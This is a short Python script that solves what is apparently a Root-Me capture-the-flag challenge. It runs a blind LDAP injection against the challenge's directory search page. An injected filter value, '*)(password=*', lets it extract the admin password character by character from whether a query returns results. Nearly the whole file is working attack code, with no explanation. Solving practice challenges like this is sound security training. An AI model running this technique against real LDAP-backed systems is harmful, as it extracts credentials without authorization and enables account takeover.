import requests
from bs4 import BeautifulSoup

en_alphabet_and_numbers = [chr(i).lower() for i in range(ord('A'), ord('Z') + 1)] + [str(i) for i in range(0, 10)]
password = []


def send_request(possible_password):
    params = {'action': 'dir',
              'search': f'admin@ch26.challenge01.root-me.org*)(password=*{possible_password}'}

    r = requests.get('http://challenge01.root-me.org/web-serveur/ch26/', params=params)

    check_response(r.text, possible_password)


def check_response(response, possible_password):
    soup = BeautifulSoup(response, 'html.parser')
    result = soup.findAll('p')
    result = str(result[0].text)

    if result != '0 results' and result != 'ERROR : Invalid LDAP syntax':
        print(possible_password)
        password.clear()
        password.append(possible_password)


def brute():
    for iteration in range(0, 10):
        for symbol in en_alphabet_and_numbers:
            if not password:
                send_request(symbol)
            else:
                send_request(''.join(password) + symbol)


if __name__ == '__main__':
    print('### START ###\n')
    brute()
    print(f'\n### END ###\n\nPassword: {password[0]}')
